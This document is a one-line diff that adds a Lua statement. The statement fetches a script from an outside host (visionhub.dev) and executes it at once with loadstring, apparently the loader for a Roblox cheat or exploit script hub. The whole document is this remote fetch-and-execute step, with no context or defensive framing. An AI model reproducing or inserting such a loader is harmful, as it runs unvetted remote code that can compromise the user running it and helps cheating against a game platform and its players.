@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://visionhub.dev/loader.lua'))()
